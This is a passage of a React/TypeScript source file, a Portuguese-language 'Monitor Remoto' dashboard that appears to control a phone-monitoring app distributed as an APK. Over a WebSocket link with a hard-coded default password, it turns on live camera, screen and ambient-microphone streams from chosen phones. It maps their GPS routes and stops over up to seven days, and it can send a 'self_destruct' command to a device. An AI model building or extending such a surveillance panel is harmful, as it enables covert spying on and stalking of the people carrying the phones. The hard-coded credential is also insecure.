'use client';

import { useEffect, useRef, useState, useCallback, useMemo } from 'react';
import {
  Wifi, WifiOff, Settings, Download, Smartphone,
  Camera, Monitor as MonitorIcon, Mic, MapPin,
  RefreshCw, Gauge, Clock, Trash2,
  Maximize2, X, ChevronLeft, ChevronRight, Route,
} from 'lucide-react';

const DEFAULT_WS_URL = 'wss://server-production-6a5c.up.railway.app';
const DEFAULT_PASSWORD = 'monitor123';
const HISTORY_INTERVAL_MS = 20_000; // min gap between locally-buffered GPS points (matches server)
const STOP_RADIUS_M = 40;           // consecutive points within this radius = same stop
const STOP_MIN_MS   = 5 * 60_000;   // stationary for at least 5 min counts as a stop
const MAX_DOTS      = 1500;         // cap on individual point markers per map

const HISTORY_RANGES = [
  { label: '24h',     hours: 24  },
  { label: '2 dias',  hours: 48  },
  { label: '3 dias',  hours: 72  },
  { label: '4 dias',  hours: 96  },
  { label: '5 dias',  hours: 120 },
  { label: '6 dias',  hours: 144 },
  { label: '7 dias',  hours: 168 },
];

interface Device      { id: string; name: string; online: boolean; }
interface DeviceInfo  { battery: number; charging: boolean; network: 'wifi' | 'mobile' | 'none'; }
interface LocationData { lat: number; lng: number; accuracy: number; speed: number; bearing: number; }
interface LocPoint    { lat: number; lng: number; time: number; speed?: number; }
interface Stop        { lat: number; lng: number; start: number; end: number; }

function httpBase(wsUrl: string) {
  return (wsUrl || DEFAULT_WS_URL).replace(/^ws/, 'http');
}

async function fetchHistory(wsUrl: string, deviceId: string, hours: number): Promise<LocPoint[]> {
  try {
    const res = await fetch(`${httpBase(wsUrl)}/api/history/${deviceId}?hours=${hours}`);
    if (!res.ok) return [];
    const data = await res.json() as { lat: number; lng: number; t: number; s?: number }[];
    return data.map(p => ({ lat: p.lat, lng: p.lng, time: p.t, speed: p.s }));
  } catch { return []; }
}

function haversineM(a: { lat: number; lng: number }, b: { lat: number; lng: number }) {
  const R = 6371000, rad = Math.PI / 180;
  const dLat = (b.lat - a.lat) * rad, dLng = (b.lng - a.lng) * rad;
  const s = Math.sin(dLat / 2) ** 2
    + Math.cos(a.lat * rad) * Math.cos(b.lat * rad) * Math.sin(dLng / 2) ** 2;
  return 2 * R * Math.asin(Math.sqrt(s));
}

// Groups consecutive points that stay within STOP_RADIUS_M of the running
// centroid; clusters lasting >= STOP_MIN_MS become stops.
function detectStops(pts: LocPoint[]): Stop[] {
  const stops: Stop[] = [];
  let i = 0;
  while (i < pts.length) {
    let lat = pts[i].lat, lng = pts[i].lng, n = 1, j = i;
    while (j + 1 < pts.length && haversineM({ lat, lng }, pts[j + 1]) <= STOP_RADIUS_M) {
      j++; n++;
      lat += (pts[j].lat - lat) / n;
      lng += (pts[j].lng - lng) / n;
    }
    if (pts[j].time - pts[i].time >= STOP_MIN_MS)
      stops.push({ lat, lng, start: pts[i].time, end: pts[j].time });
    i = j + 1;
  }
  return stops;
}

function fmtDateTime(t: number) {
  return new Date(t).toLocaleString('pt-BR', {
    day: '2-digit', month: '2-digit', hour: '2-digit', minute: '2-digit',
  });
}

function fmtDur(ms: number) {
  const min = Math.round(ms / 60_000);
  if (min < 60) return `${min} min`;
  return `${Math.floor(min / 60)}h ${min % 60}min`;
}

// Polyline + per-point dots + start marker + stop markers, as one layer group
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function buildRouteLayer(history: LocPoint[], stops: Stop[]): any {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const L = (window as any).L;
  const group = L.layerGroup();

  L.polyline(history.map(p => [p.lat, p.lng]),
    { color: '#3b82f6', weight: 3, opacity: 0.75 }).addTo(group);

  const step = Math.max(1, Math.ceil(history.length / MAX_DOTS));
  history.forEach((p, idx) => {
    if (idx % step !== 0 && idx !== history.length - 1) return;
    const kmh = p.speed != null ? ` · ${(p.speed * 3.6).toFixed(0)} km/h` : '';
    L.circleMarker([p.lat, p.lng],
      { radius: 3.5, weight: 1, color: '#1d4ed8', fillColor: '#60a5fa', fillOpacity: 0.9 })
      .bindPopup(`<b>${fmtDateTime(p.time)}</b>${kmh}`)
      .addTo(group);
  });

  if (history.length) {
    const first = history[0];
    L.circleMarker([first.lat, first.lng],
      { radius: 6, weight: 2, color: '#15803d', fillColor: '#22c55e', fillOpacity: 1 })
      .bindPopup(`<b>Início</b><br>${fmtDateTime(first.time)}`)
      .addTo(group);
  }

  stops.forEach(s => {
    L.circleMarker([s.lat, s.lng],
      { radius: 9, weight: 2, color: '#b45309', fillColor: '#f59e0b', fillOpacity: 0.9 })
      .bindPopup(
        `<b>⏸ Parado ${fmtDur(s.end - s.start)}</b><br>` +
        `Chegou: ${fmtDateTime(s.start)}<br>Saiu: ${fmtDateTime(s.end)}`)
      .addTo(group);
  });

  return group;
}

function loadScript(src: string): Promise<void> {
  return new Promise((res, rej) => {
    if (document.querySelector(`script[src="${src}"]`)) { res(); return; }
    const s = document.createElement('script'); s.src = src;
    s.onload = () => res(); s.onerror = rej;
    document.head.appendChild(s);
  });
}
function loadLink(href: string) {
  if (document.querySelector(`link[href="${href}"]`)) return;
  const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = href;
  document.head.appendChild(l);
}

// eslint-disable-next-line @typescript-eslint/no-explicit-any
function makeMap(el: HTMLElement, center: [number, number]): any {
  const L = (window as any).L;
  const m = L.map(el, { zoomControl: true, preferCanvas: true }).setView(center, 15);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OSM' }).addTo(m);
  return m;
}

export default function MonitorPage() {
  const [wsUrl,        setWsUrl]        = useState(DEFAULT_WS_URL);
  const [password,     setPassword]     = useState(DEFAULT_PASSWORD);
  const [showSettings, setShowSettings] = useState(false);
  const [connected,    setConnected]    = useState(false);
  const [loginError,   setLoginError]   = useState('');

  const [devices,        setDevices]        = useState<Device[]>([]);
  const [activeDeviceId, setActiveDeviceId] = useState<string | null>(null);
  const [deviceInfoMap,  setDeviceInfoMap]  = useState<Record<string, DeviceInfo>>({});
  const [activeStreams,  setActiveStreams]  = useState<Set<string>>(new Set());
  const [location,       setLocation]       = useState<LocationData | null>(null);
  const [lastUpdate,     setLastUpdate]     = useState('');
  const [fps,            setFps]            = useState(0);
  const [destroyConfirm, setDestroyConfirm] = useState<Device | null>(null);

  const [sidebarOpen,    setSidebarOpen]    = useState(false);
  const [expandedStream, setExpandedStream] = useState<string | null>(null);
  const [locationHistory, setLocationHistory] = useState<LocPoint[]>([]);
  const [showRoute,      setShowRoute]      = useState(false);
  const [historyHours,   setHistoryHours]   = useState(24);

  // WebSocket & canvas refs
  const wsRef              = useRef<WebSocket | null>(null);
  const cameraCanvasRef    = useRef<HTMLCanvasElement>(null);
  const cameraFullCanvasRef = useRef<HTMLCanvasElement>(null);
  const screenCanvasRef    = useRef<HTMLCanvasElement>(null);
  const screenFullCanvasRef = useRef<HTMLCanvasElement>(null);
  const cameraImgRef       = useRef<HTMLImageElement | null>(null);
  const screenImgRef       = useRef<HTMLImageElement | null>(null);
  const audioCtxRef        = useRef<AudioContext | null>(null);
  const audioNextRef       = useRef(0);
  const fpsCountRef        = useRef(0);

  // state refs to avoid stale closures
  const activeDeviceRef    = useRef<string | null>(null);
  const activeStreamsRef   = useRef<Set<string>>(new Set());
  const locationHistoryRef = useRef<LocPoint[]>([]);
  const showRouteRef       = useRef(false);

  // Leaflet refs — main map
  const mapRef        = useRef<unknown>(null);
  const markerRef     = useRef<unknown>(null);
  const routeLayerRef = useRef<unknown>(null);

  // Leaflet refs — fullscreen map
  const mapFullRef        = useRef<unknown>(null);
  const markerFullRef     = useRef<unknown>(null);
  const routeLayerFullRef = useRef<unknown>(null);

  useEffect(() => { activeDeviceRef.current  = activeDeviceId;  }, [activeDeviceId]);
  useEffect(() => { activeStreamsRef.current  = activeStreams;   }, [activeStreams]);
  useEffect(() => { locationHistoryRef.current = locationHistory; }, [locationHistory]);
  useEffect(() => { showRouteRef.current      = showRoute;       }, [showRoute]);

  // fps counter
  useEffect(() => {
    const t = setInterval(() => { setFps(fpsCountRef.current); fpsCountRef.current = 0; }, 1000);
    return () => clearInterval(t);
  }, []);

  // ── Leaflet main map ────────────────────────────────────────────────────

  const initMap = useCallback(async () => {
    if (mapRef.current) return;
    loadLink('https://unpkg.com/leaflet@1.9.4/dist/leaflet.css');
    await loadScript('https://unpkg.com/leaflet@1.9.4/dist/leaflet.js');
    const el = document.getElementById('monitor-map');
    if (!el) return;
    mapRef.current = makeMap(el, [-15.78, -47.93]);
  }, []);

  const updateMarker = useCallback((loc: LocationData, ts: string) => {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const L = (window as any).L; const m = mapRef.current as any;
    if (!L || !m) return;
    const ll: [number, number] = [loc.lat, loc.lng];
    if (!markerRef.current) markerRef.current = L.marker(ll).addTo(m);
    else (markerRef.current as any).setLatLng(ll);
    (markerRef.current as any).bindPopup(`<b>Localização atual</b><br>${ts}`);
    m.setView(ll, 16);
  }, []);

  const updateRoute = useCallback((history: LocPoint[], show: boolean) => {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const L = (window as any).L; const m = mapRef.current as any;
    if (!L || !m) return;
    if (routeLayerRef.current) { (routeLayerRef.current as any).remove(); routeLayerRef.current = null; }
    if (show && history.length > 1) {
      routeLayerRef.current = buildRouteLayer(history, detectStops(history)).addTo(m);
    }
  }, []);

  // ── Fullscreen location map ─────────────────────────────────────────────

  const initFullMap = useCallback((loc: LocationData | null, history: LocPoint[], show: boolean, ts: string) => {
    const el = document.getElementById('monitor-map-full');
    if (!el || mapFullRef.current) return;
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const L = (window as any).L;
    if (!L) return;
    const center: [number, number] = loc ? [loc.lat, loc.lng] : [-15.78, -47.93];
    const m = makeMap(el, center);
    mapFullRef.current = m;
    if (loc) {
      markerFullRef.current = L.marker([loc.lat, loc.lng]).addTo(m);
      (markerFullRef.current as any).bindPopup(`<b>Localização atual</b><br>${ts}`).openPopup();
    }
    if (show && history.length > 1) {
      routeLayerFullRef.current = buildRouteLayer(history, detectStops(history)).addTo(m);
    }
  }, []);

  const updateRouteFull = useCallback((history: LocPoint[], show: boolean) => {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const L = (window as any).L; const m = mapFullRef.current as any;
    if (!L || !m) return;
    if (routeLayerFullRef.current) { (routeLayerFullRef.current as any).remove(); routeLayerFullRef.current = null; }
    if (show && history.length > 1) {
      routeLayerFullRef.current = buildRouteLayer(history, detectStops(history)).addTo(m);
    }
  }, []);

  const destroyFullMap = useCallback(() => {
    if (mapFullRef.current) { (mapFullRef.current as any).remove(); mapFullRef.current = null; }
    markerFullRef.current = null; routeLayerFullRef.current = null;
  }, []);

  // Init / destroy fullscreen map when modal opens/closes
  useEffect(() => {
    if (expandedStream !== 'location') { destroyFullMap(); return; }
    const t = setTimeout(() =>
      initFullMap(location, locationHistoryRef.current, showRouteRef.current, lastUpdate), 150);
    return () => clearTimeout(t);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [expandedStream]);

  // Update route layer on main map whenever route toggle or history changes
  useEffect(() => {
    updateRoute(locationHistory, showRoute);
  }, [showRoute, locationHistory, updateRoute]);

  // Update route layer on fullscreen map whenever route toggle or history changes
  useEffect(() => {
    if (expandedStream === 'location') updateRouteFull(locationHistory, showRoute);
  }, [showRoute, locationHistory, expandedStream, updateRouteFull]);

  // Detected stops (>= 5 min within ~40m) — for the labels below the maps
  const stops = useMemo(() => detectStops(locationHistory), [locationHistory]);

  // Fetch persisted history from server (covers gaps while page was closed)
  useEffect(() => {
    if (!activeDeviceId) return;
    let cancelled = false;
    fetchHistory(wsUrl, activeDeviceId, historyHours).then(pts => {
      if (!cancelled) setLocationHistory(pts);
    });
    return () => { cancelled = true; };
  }, [activeDeviceId, historyHours, wsUrl]);

  // ── Frame rendering ─────────────────────────────────────────────────────

  const renderFrame = useCallback((source: string, b64: string) => {
    const normals  = source === 'screen' ? screenCanvasRef     : cameraCanvasRef;
    const fulls    = source === 'screen' ? screenFullCanvasRef : cameraFullCanvasRef;
    const imgRef   = source === 'screen' ? screenImgRef        : cameraImgRef;
    if (!imgRef.current) imgRef.current = new Image();
    const img = imgRef.current;
    img.onload = () => {
      [normals.current, fulls.current].forEach(canvas => {
        if (!canvas) return;
        canvas.width  = img.naturalWidth;
        canvas.height = img.naturalHeight;
        canvas.getContext('2d')?.drawImage(img, 0, 0);
      });
      if (source === 'camera') fpsCountRef.current++;
    };
    img.src = 'data:image/jpeg;base64,' + b64;
  }, []);

  // ── Audio playback ──────────────────────────────────────────────────────

  const playAudio = useCallback((b64: string) => {
    if (!audioCtxRef.current) audioCtxRef.current = new AudioContext({ sampleRate: 16000 });
    const ctx = audioCtxRef.current;
    if (ctx.state === 'suspended') ctx.resume();

    const bin = atob(b64);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    const samples = bytes.length / 2;
    const f32 = new Float32Array(samples);
    const dv = new DataView(bytes.buffer);
    for (let i = 0; i < samples; i++) f32[i] = dv.getInt16(i * 2, true) / 32768;
    const buf = ctx.createBuffer(1, samples, 16000);
    buf.getChannelData(0).set(f32);
    const src = ctx.createBufferSource();
    src.buffer = buf; src.connect(ctx.destination);

    const now = ctx.currentTime;
    // cap audio buffer lag at 400 ms to prevent runaway delay
    if (audioNextRef.current > now + 0.4) audioNextRef.current = now + 0.04;
    const start = Math.max(now, audioNextRef.current);
    src.start(start);
    audioNextRef.current = start + buf.duration;
  }, []);

  // ── WebSocket ───────────────────────────────────────────────────────────

  const connect = useCallback((url: string, pwd: string) => {
    if (wsRef.current) { wsRef.current.close(); wsRef.current = null; }
    const ws = new WebSocket(url);
    wsRef.current = ws;

    ws.onopen = () => ws.send(JSON.stringify({ type: 'auth', password: pwd, role: 'viewer' }));

    ws.onmessage = (e) => {
      let msg: Record<string, unknown>;
      try { msg = JSON.parse(e.data); } catch { return; }

      switch (msg.type) {
        case 'auth':
          if (msg.success) { setConnected(true); setLoginError(''); initMap(); }
          else { setLoginError('Senha incorreta.'); ws.close(); }
          break;

        case 'devices': {
          const list = msg.list as Device[];
          setDevices(list);
          setActiveDeviceId(prev => {
            if (prev && list.find(d => d.id === prev)) return prev;
            return list.find(d => d.online)?.id ?? list[0]?.id ?? null;
          });
          break;
        }

        case 'device_info': {
          const did = msg.deviceId as string;
          if (did) setDeviceInfoMap(prev => ({
            ...prev,
            [did]: { battery: msg.battery as number, charging: msg.charging as boolean,
                     network: msg.network as 'wifi' | 'mobile' | 'none' },
          }));
          break;
        }

        case 'frame':
          if (msg.deviceId === activeDeviceRef.current)
            renderFrame(msg.source as string, msg.data as string);
          break;

        case 'audio':
          if (msg.deviceId === activeDeviceRef.current && activeStreamsRef.current.has('audio'))
            playAudio(msg.data as string);
          break;

        case 'location': {
          if (msg.deviceId !== activeDeviceRef.current) break;
          const loc = msg as unknown as LocationData & { type: string; deviceId: string };
          setLocation(loc);
          const ts = new Date().toLocaleString('pt-BR');
          setLastUpdate(ts);
          updateMarker(loc, ts);

          // accumulate history locally for live route updates
          // (the server also persists every point — see fetchHistory)
          const newPt: LocPoint = { lat: loc.lat, lng: loc.lng, time: Date.now(), speed: loc.speed };
          setLocationHistory(prev => {
            const last = prev[prev.length - 1];
            if (last && newPt.time - last.time < HISTORY_INTERVAL_MS) return prev;
            return [...prev, newPt];
          });
          break;
        }
      }
    };

    ws.onclose = () => {
      setConnected(false); setDevices([]); setActiveStreams(new Set());
      setTimeout(() => {
        const u = localStorage.getItem('monitor_ws_url') || DEFAULT_WS_URL;
        const p = localStorage.getItem('monitor_ws_pwd') || DEFAULT_PASSWORD;
        connect(u, p);
      }, 3000);
    };

    ws.onerror = () => setLoginError('Não foi possível conectar.');
  }, [initMap, updateMarker, renderFrame, playAudio]);

  useEffect(() => {
    const url = localStorage.getItem('monitor_ws_url') || DEFAULT_WS_URL;
    const pwd = localStorage.getItem('monitor_ws_pwd') || DEFAULT_PASSWORD;
    setWsUrl(url); setPassword(pwd);
    connect(url, pwd);
    return () => { wsRef.current?.close(); };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  function saveAndConnect() {
    if (!wsUrl.trim()) return;
    localStorage.setItem('monitor_ws_url', wsUrl.trim());
    localStorage.setItem('monitor_ws_pwd', password);
    setShowSettings(false);
    connect(wsUrl.trim(), password);
  }

  function toggleStream(stream: string) {
    const isActive = activeStreams.has(stream);
    wsRef.current?.send(JSON.stringify({
      type: 'cmd', action: isActive ? 'unsubscribe' : 'subscribe',
      stream, deviceId: activeDeviceId,
    }));
    setActiveStreams(prev => {
      const s = new Set(prev);
      if (isActive) s.delete(stream); else s.add(stream);
      return s;
    });
  }

  function selectDevice(id: string) {
    if (activeDeviceId && activeDeviceId !== id) {
      activeStreamsRef.current.forEach(stream =>
        wsRef.current?.send(JSON.stringify({ type: 'cmd', action: 'unsubscribe', stream, deviceId: activeDeviceId }))
      );
      setActiveStreams(new Set());
      setLocation(null);
      setLastUpdate('');
    }
    setActiveDeviceId(id);
    setLocationHistory([]);
    // reset map
    if (mapRef.current) {
      if (markerRef.current)     { (markerRef.current as any).remove();     markerRef.current     = null; }
      if (routeLayerRef.current) { (routeLayerRef.current as any).remove(); routeLayerRef.current = null; }
    }
  }

  function switchCamera() {
    wsRef.current?.send(JSON.stringify({ type: 'cmd', action: 'switch_camera', deviceId: activeDeviceId }));
  }

  function selfDestruct(deviceId: string) {
    wsRef.current?.send(JSON.stringify({ type: 'cmd', action: 'self_destruct', deviceId }));
    setDestroyConfirm(null);
  }

  const activeDevice = devices.find(d => d.id === activeDeviceId);
  const devInfo = activeDeviceId ? deviceInfoMap[activeDeviceId] : null;

  // ── Helpers ──────────────────────────────────────────────────────────────

  function streamLabel(s: string) {
    return s === 'camera' ? 'Câmera' : s === 'screen' ? 'Tela' :
           s === 'audio'  ? 'Áudio'  : 'Localização';
  }

  // ── Render ───────────────────────────────────────────────────────────────

  return (
    <div className="flex flex-col h-full -m-4 md:-m-6 bg-gray-950 overflow-hidden">

      {/* ── Top bar ── */}
      <div className="flex items-center gap-3 px-4 py-2.5 bg-gray-900 border-b border-gray-800 flex-shrink-0">
        <span className="text-sm font-bold text-white">Monitor Remoto</span>
        <div className="flex items-center gap-1.5 ml-auto">
          {connected
            ? <><Wifi className="w-3.5 h-3.5 text-green-400" /><span className="text-xs text-green-400">online</span></>
            : <><WifiOff className="w-3.5 h-3.5 text-red-400" /><span className="text-xs text-red-400">desconectado</span></>
          }
          <a href={`${(wsUrl || DEFAULT_WS_URL).replace(/^wss?:/, 'https:')}/download/monitor.apk`}
            download="Monitor.apk"
            className="p-1.5 rounded text-gray-500 hover:text-white hover:bg-gray-800 transition-colors ml-1"
            title="Baixar APK">
            <Download className="w-4 h-4" />
          </a>
          <button onClick={() => setShowSettings(true)}
            className="p-1.5 rounded text-gray-500 hover:text-white hover:bg-gray-800 transition-colors">
            <Settings className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* ── Main ── */}
      <div className="flex flex-1 min-h-0 overflow-hidden">

        {/* ── Device sidebar ── */}
        <div className={`flex-shrink-0 border-r border-gray-800 bg-gray-900 flex flex-col transition-all duration-200
            ${sidebarOpen ? 'w-52' : 'w-10'}`}>

          {/* Sidebar toggle */}
          <button onClick={() => setSidebarOpen(v => !v)}
            className="flex items-center justify-center h-9 border-b border-gray-800
              text-gray-500 hover:text-white hover:bg-gray-800 transition-colors flex-shrink-0">
            {sidebarOpen
              ? <ChevronLeft className="w-4 h-4" />
              : <ChevronRight className="w-4 h-4" />
            }
          </button>

          {sidebarOpen ? (
            /* ── Full list ── */
            <div className="flex flex-col flex-1 overflow-y-auto">
              <div className="px-3 pt-2 pb-1 text-[10px] font-bold text-gray-500 uppercase tracking-widest">
                Aparelhos
              </div>
              {devices.length === 0 ? (
                <div className="flex flex-col items-center justify-center flex-1 py-10 gap-2 px-4">
                  <Smartphone className="w-8 h-8 text-gray-700" />
                  <p className="text-xs text-gray-600 text-center">
                    {connected ? 'Nenhum aparelho' : 'Aguardando...'}
                  </p>
                </div>
              ) : (
                devices.map(d => {
                  const info = deviceInfoMap[d.id];
                  const sel  = d.id === activeDeviceId;
                  return (
                    <div key={d.id}
                      className={`relative group border-b border-gray-800/50 cursor-pointer transition-colors
                        ${sel ? 'bg-gray-800' : 'hover:bg-gray-800/50'}`}
                      onClick={() => selectDevice(d.id)}>
                      <div className="px-3 py-2.5">
                        <div className="flex items-center gap-2 mb-0.5">
                          <div className={`w-2 h-2 rounded-full flex-shrink-0
                            ${d.online ? 'bg-green-400 shadow-[0_0_4px_#4ade80]' : 'bg-gray-600'}`} />
                          <span className="text-sm text-white font-medium truncate">{d.name}</span>
                        </div>
                        {d.online && info ? (
                          <div className="flex items-center gap-2 pl-4 text-xs text-gray-500">
                            <span>🔋 {info.battery}%{info.charging ? '⚡' : ''}</span>
                            <span>{info.network === 'wifi' ? '📶' : info.network === 'mobile' ? '📱' : '—'}</span>
                          </div>
                        ) : (
                          <p className="pl-4 text-xs text-gray-600">{d.online ? '...' : 'offline'}</p>
                        )}
                      </div>
                      <button onClick={e => { e.stopPropagation(); setDestroyConfirm(d); }}
                        className="absolute right-2 top-1/2 -translate-y-1/2 p-1 rounded
                          opacity-0 group-hover:opacity-100 text-gray-600 hover:text-red-400 hover:bg-red-950 transition-all">
                        <Trash2 className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  );
                })
              )}
            </div>
          ) : (
            /* ── Collapsed dots ── */
            <div className="flex flex-col items-center pt-2 gap-2 overflow-y-auto flex-1">
              {devices.map(d => (
                <button key={d.id} title={d.name} onClick={() => selectDevice(d.id)}
                  className={`w-7 h-7 rounded-full flex items-center justify-center transition-colors
                    ${d.id === activeDeviceId ? 'bg-blue-600' : 'hover:bg-gray-800'}`}>
                  <div className={`w-3 h-3 rounded-full
                    ${d.online ? 'bg-green-400' : 'bg-gray-600'}`} />
                </button>
              ))}
            </div>
          )}
        </div>

        {/* ── Device detail ── */}
        {activeDevice ? (
          <div className="flex-1 flex flex-col min-h-0 overflow-y-auto">

            {/* header */}
            <div className="px-4 py-2.5 border-b border-gray-800 bg-gray-900 flex-shrink-0">
              <div className="flex items-center gap-2">
                <Smartphone className="w-4 h-4 text-gray-500" />
                <span className="text-white font-semibold text-sm">{activeDevice.name}</span>
                {fps > 0 && <span className="ml-auto text-xs text-gray-600">{fps} fps</span>}
              </div>
              <div className="flex items-center gap-3 mt-1 text-xs text-gray-500 flex-wrap">
                {activeDevice.online ? (
                  <>
                    <span className="text-green-400 font-medium">● online</span>
                    {devInfo && (
                      <>
                        <span>🔋 {devInfo.battery}%{devInfo.charging ? ' ⚡' : ''}</span>
                        <span>
                          {devInfo.network === 'wifi' ? '📶 WiFi' :
                           devInfo.network === 'mobile' ? '📱 Dados' : '✕ Sem rede'}
                        </span>
                      </>
                    )}
                  </>
                ) : <span className="text-red-400">● offline</span>}
              </div>
            </div>

            {/* 2×2 stream grid */}
            <div className="grid grid-cols-2 gap-3 p-3 flex-1 min-h-0">

              {/* ── Camera ── */}
              <div className={`rounded-xl border flex flex-col overflow-hidden
                ${activeStreams.has('camera') ? 'border-blue-600' : 'border-gray-800'} bg-gray-900`}>
                <div className="flex items-center justify-between px-3 py-2 border-b border-gray-800">
                  <div className="flex items-center gap-1.5">
                    <Camera className="w-4 h-4 text-gray-400" />
                    <span className="text-sm font-medium text-white">Câmera</span>
                  </div>
                  <div className="flex items-center gap-1">
                    {activeStreams.has('camera') && (
                      <>
                        <button onClick={switchCamera}
                          className="p-1 rounded text-gray-500 hover:text-blue-400 hover:bg-gray-800 transition-colors"
                          title="Virar câmera"><RefreshCw className="w-3.5 h-3.5" /></button>
                        <button onClick={() => setExpandedStream('camera')}
                          className="p-1 rounded text-gray-500 hover:text-white hover:bg-gray-800 transition-colors"
                          title="Tela cheia"><Maximize2 className="w-3.5 h-3.5" /></button>
                      </>
                    )}
                    <button onClick={() => toggleStream('camera')} disabled={!activeDevice.online}
                      className={`px-2 py-0.5 rounded text-xs font-medium transition-colors disabled:opacity-40
                        ${activeStreams.has('camera') ? 'bg-blue-600 text-white hover:bg-blue-700'
                          : 'bg-gray-800 text-gray-400 hover:text-white hover:bg-gray-700'}`}>
                      {activeStreams.has('camera') ? 'Desligar' : 'Ligar'}
                    </button>
                  </div>
                </div>
                {activeStreams.has('camera') ? (
                  <div className="flex-1 bg-black flex items-center justify-center min-h-[140px]">
                    <canvas ref={cameraCanvasRef} className="max-w-full max-h-full object-contain" />
                  </div>
                ) : (
                  <div className="flex-1 flex items-center justify-center min-h-[100px]">
                    <Camera className="w-10 h-10 text-gray-800" />
                  </div>
                )}
              </div>

              {/* ── Screen ── */}
              <div className={`rounded-xl border flex flex-col overflow-hidden
                ${activeStreams.has('screen') ? 'border-purple-600' : 'border-gray-800'} bg-gray-900`}>
                <div className="flex items-center justify-between px-3 py-2 border-b border-gray-800">
                  <div className="flex items-center gap-1.5">
                    <MonitorIcon className="w-4 h-4 text-gray-400" />
                    <span className="text-sm font-medium text-white">Tela</span>
                  </div>
                  <div className="flex items-center gap-1">
                    {activeStreams.has('screen') && (
                      <button onClick={() => setExpandedStream('screen')}
                        className="p-1 rounded text-gray-500 hover:text-white hover:bg-gray-800 transition-colors"
                        title="Tela cheia"><Maximize2 className="w-3.5 h-3.5" /></button>
                    )}
                    <button onClick={() => toggleStream('screen')} disabled={!activeDevice.online}
                      className={`px-2 py-0.5 rounded text-xs font-medium transition-colors disabled:opacity-40
                        ${activeStreams.has('screen') ? 'bg-purple-600 text-white hover:bg-purple-700'
                          : 'bg-gray-800 text-gray-400 hover:text-white hover:bg-gray-700'}`}>
                      {activeStreams.has('screen') ? 'Desligar' : 'Ligar'}
                    </button>
                  </div>
                </div>
                {activeStreams.has('screen') ? (
                  <div className="flex-1 bg-black flex items-center justify-center min-h-[140px]">
                    <canvas ref={screenCanvasRef} className="max-w-full max-h-full object-contain" />
                  </div>
                ) : (
                  <div className="flex-1 flex items-center justify-center min-h-[100px]">
                    <MonitorIcon className="w-10 h-10 text-gray-800" />
                  </div>
                )}
              </div>

              {/* ── Audio ── */}
              <div className={`rounded-xl border flex flex-col overflow-hidden
                ${activeStreams.has('audio') ? 'border-green-600' : 'border-gray-800'} bg-gray-900`}>
                <div className="flex items-center justify-between px-3 py-2 border-b border-gray-800">
                  <div className="flex items-center gap-1.5">
                    <Mic className="w-4 h-4 text-gray-400" />
                    <span className="text-sm font-medium text-white">Áudio ambiente</span>
                  </div>
                  <div className="flex items-center gap-1">
                    {activeStreams.has('audio') && (
                      <button onClick={() => setExpandedStream('audio')}
                        className="p-1 rounded text-gray-500 hover:text-white hover:bg-gray-800 transition-colors"
                        title="Tela cheia"><Maximize2 className="w-3.5 h-3.5" /></button>
                    )}
                    <button onClick={() => toggleStream('audio')} disabled={!activeDevice.online}
                      className={`px-2 py-0.5 rounded text-xs font-medium transition-colors disabled:opacity-40
                        ${activeStreams.has('audio') ? 'bg-green-600 text-white hover:bg-green-700'
                          : 'bg-gray-800 text-gray-400 hover:text-white hover:bg-gray-700'}`}>
                      {activeStreams.has('audio') ? 'Desligar' : 'Ligar'}
                    </button>
                  </div>
                </div>
                <div className="flex-1 flex items-center justify-center min-h-[100px]">
                  {activeStreams.has('audio') ? (
                    <div className="flex flex-col items-center gap-2">
                      <div className="flex gap-1 items-end h-8">
                        {[3,5,7,5,8,4,6,3,5,7,4].map((h, i) => (
                          <div key={i} className="w-1.5 bg-green-400 rounded-full animate-pulse"
                            style={{ height: `${h * 3}px`, animationDelay: `${i * 70}ms` }} />
                        ))}
                      </div>
                      <span className="text-xs text-green-400 font-medium">Ouvindo...</span>
                    </div>
                  ) : <Mic className="w-10 h-10 text-gray-800" />}
                </div>
              </div>

              {/* ── Location ── */}
              <div className="rounded-xl border border-gray-800 bg-gray-900 flex flex-col overflow-hidden">
                <div className="flex items-center justify-between px-3 py-2 border-b border-gray-800">
                  <div className="flex items-center gap-1.5">
                    <MapPin className="w-4 h-4 text-gray-400" />
                    <span className="text-sm font-medium text-white">Localização</span>
                  </div>
                  <div className="flex items-center gap-1">
                    <select value={historyHours} onChange={e => setHistoryHours(Number(e.target.value))}
                      title="Período do histórico"
                      className="bg-gray-800 border border-gray-700 rounded text-[10px] text-gray-300
                        px-1 py-0.5 focus:outline-none focus:border-blue-500">
                      {HISTORY_RANGES.map(r => (
                        <option key={r.hours} value={r.hours}>{r.label}</option>
                      ))}
                    </select>
                    <button onClick={() => setShowRoute(v => !v)}
                      title="Mostrar rota"
                      className={`p-1 rounded transition-colors
                        ${showRoute ? 'text-blue-400 bg-blue-950' : 'text-gray-500 hover:text-white hover:bg-gray-800'}`}>
                      <Route className="w-3.5 h-3.5" />
                    </button>
                    <button onClick={() => setExpandedStream('location')}
                      className="p-1 rounded text-gray-500 hover:text-white hover:bg-gray-800 transition-colors"
                      title="Tela cheia"><Maximize2 className="w-3.5 h-3.5" /></button>
                    {location && (
                      <div className="flex items-center gap-1 text-xs text-gray-500 ml-1">
                        <Gauge className="w-3 h-3" />
                        <span>{(location.speed * 3.6).toFixed(0)} km/h</span>
                      </div>
                    )}
                  </div>
                </div>
                <div id="monitor-map" className="flex-1 min-h-[140px] bg-gray-800" />
                {location ? (
                  <div className="px-3 py-1.5 border-t border-gray-800 flex items-center justify-between text-xs text-gray-500">
                    <span>±{Math.round(location.accuracy)}m · {locationHistory.length} pts · {stops.length} paradas</span>
                    <div className="flex items-center gap-1">
                      <Clock className="w-3 h-3" />
                      <span>{lastUpdate}</span>
                    </div>
                  </div>
                ) : (
                  <div className="px-3 py-1.5 text-xs text-gray-600 text-center">Aguardando GPS...</div>
                )}
              </div>

            </div>
